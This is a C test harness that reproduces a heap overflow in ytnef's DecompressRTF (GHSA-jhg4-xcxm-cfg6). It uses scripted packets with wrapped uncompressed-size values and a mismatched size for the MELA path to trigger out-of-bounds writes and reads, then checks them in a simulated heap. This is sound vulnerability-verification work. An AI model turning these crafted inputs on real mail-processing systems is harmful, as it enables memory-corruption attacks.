/*
 * Direct-call harness for GHSA-jhg4-xcxm-cfg6 (ytnef DecompressRTF).
 * The RTF_PREBUF define, SwapDWord() and DecompressRTF() are extracted
 * verbatim from the pinned lib/ytnef.c on every run (see gen_fn.py).
 * Everything else here is deterministic types, stubs and a scripted input.
 * No TNEF file, ytnef build, mail client or network is used.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include <stdint.h>

/* Verbatim public typedefs from lib/tnef-types.h (pins v2.1.2 / v2.1.3). */
typedef unsigned char BYTE;
typedef unsigned short WORD;
typedef unsigned int DWORD;
typedef unsigned int ULONG;
typedef struct {
  BYTE *data;
  int size;
} variableLength;

/* Verbatim macro from pinned lib/ytnef.c line 60. */
#define ALLOCCHECK_CHAR(x) { if(!x) { printf("Out of Memory at %s : %i\n", __FILE__, __LINE__); return(NULL); } }

#ifdef PLAIN_MODE
/* Deterministic arena: only the verbatim function's calloc/free are renamed.
 * Each slot is 16-byte aligned, prefilled with 0xEE, with its first `total`
 * bytes zeroed as calloc would do. Bytes past a slot stay observable. */
#define ARENA_SIZE 8192
static unsigned char g_arena[ARENA_SIZE];
static size_t g_off, g_nslices;
static size_t g_slice_off[8], g_slice_len[8];
static void *hcalloc(size_t n, size_t s)
{
    size_t total = n * s;
    size_t slot = (total + 15u) & ~(size_t)15u;
    void *p;
    if (g_nslices >= 8 || total > ARENA_SIZE || slot > ARENA_SIZE - g_off)
        return NULL;
    p = g_arena + g_off;
    memset(p, 0xEE, slot);
    memset(p, 0, total);
    g_slice_off[g_nslices] = g_off;
    g_slice_len[g_nslices] = total;
    g_nslices++;
    g_off += slot;
    return p;
}
static void hfree(void *p) { (void)p; }
#define calloc hcalloc
#define free hfree
#endif

#include FNS

static void put32(unsigned char *p, unsigned int v)
{
    p[0] = (unsigned char)(v & 0xffu);
    p[1] = (unsigned char)((v >> 8) & 0xffu);
    p[2] = (unsigned char)((v >> 16) & 0xffu);
    p[3] = (unsigned char)((v >> 24) & 0xffu);
}

#define MAGIC_LZFU 0x75465a4cu
#define MAGIC_MELA 0x414c454du
static unsigned char g_pkt[64];

int main(int argc, char **argv)
{
    const char *mode = argc > 1 ? argv[1] : "write";
    unsigned int us = 0;
    unsigned int magic = MAGIC_LZFU;
    variableLength p;
    int outsize = -1;
    BYTE *out;
    int size, i;

    if (strcmp(mode, "write") == 0) {
        size = 20; us = 0xFFFFFF41u;              /* calloc slot 16, overrun 191 */
    } else if (strcmp(mode, "write0") == 0) {
        size = 20; us = 0xFFFFFF31u;              /* calloc slot 0, overrun 207 */
    } else if (strcmp(mode, "write1") == 0) {
        size = 20; us = 0xFFFFFFFFu;              /* calloc slot 206, overrun 1 */
    } else if (strcmp(mode, "mela") == 0) {
        size = 20; us = 64; magic = MAGIC_MELA;   /* memcpy 64 from 20-byte input */
    } else if (strcmp(mode, "safe") == 0) {
        size = 25; us = 8;                        /* 1 flags byte + 8 literals */
    } else {
        fprintf(stderr, "unknown case %s\n", mode);
        return 2;
    }

#ifdef PLAIN_MODE
    memset(g_arena, 0xEE, sizeof(g_arena));
#endif
    memset(g_pkt, 0, sizeof(g_pkt));
    put32(g_pkt, (unsigned int)(size - 4));
    put32(g_pkt + 4, us);
    put32(g_pkt + 8, magic);
    if (strcmp(mode, "safe") == 0) {
        g_pkt[16] = 0x00;                          /* all literals */
        for (i = 0; i < 8; i++) g_pkt[17 + i] = (unsigned char)(0x41 + i);
    }
    p.data = (BYTE *)malloc((size_t)size);
    if (!p.data) return 2;
    memcpy(p.data, g_pkt, (size_t)size);
    p.size = size;

    fprintf(stderr, "PRECALL PIN=%s CASE=%s SIZE=%d US_DEC=%u MAGIC_DEC=%u US=0x%08x MAGIC=0x%08x\n",
            PIN, mode, p.size, us, magic, us, magic);
    out = DecompressRTF(&p, &outsize);
    printf("RESULT PIN=%s CASE=%s OUT=%s OUTSIZE=%d",
           PIN, mode, out ? "nonnull" : "null", outsize);
#ifdef PLAIN_MODE
    printf(" NSLICES=%zu", g_nslices);
#endif
    printf("\n");

#ifdef PLAIN_MODE
    {
        const char *prebuf = RTF_PREBUF;
        size_t prelen = strlen(prebuf);
        size_t base, alloc, overrun, j;
        int bad = 0;
        if (strcmp(mode, "safe") == 0) {
            size_t k, sbase = 0;
            for (k = 0; k < g_nslices; k++)
                if (g_slice_len[k] == 215u) sbase = g_slice_off[k] + 215u;
            for (k = 0; k < 8; k++)
                if (g_arena[sbase + k] != 0xEEu) bad = 1;
            printf("SAFE_BAD=%d TAIL=%02x\n", bad, g_arena[sbase]);
            return bad;
        }
        if (g_nslices < 2) {
            /* Fixed pin rejects the wrapped size before either allocation. */
            for (j = 0; j < 512; j++)
                if (g_arena[j] != 0xEEu) bad = 1;
            printf("CHOSEN_BAD=%d ALLOC=none OVERRUN=0 TAIL=%02x\n",
                   bad, g_arena[256]);
            return bad;
        }
        base = g_slice_off[1];
        alloc = g_slice_len[1];
        overrun = prelen - alloc;
        for (j = 0; j < overrun; j++) {
            if (g_arena[base + alloc + j] != (unsigned char)prebuf[alloc + j])
                bad = 1;
        }
        if (g_arena[base + prelen] != 0xEEu) bad = 1;
        printf("CHOSEN_BAD=%d ALLOC=%zu OVERRUN=%zu B0=%02x BMID=%02x BEND=%02x TAIL=%02x\n",
               bad, alloc, overrun, g_arena[base + alloc],
               g_arena[base + alloc + overrun / 2],
               g_arena[base + prelen - 1], g_arena[base + prelen]);
        return bad;
    }
#else
    printf("ASAN_CASE_DONE %s\n", mode);
    return 0;
#endif
}
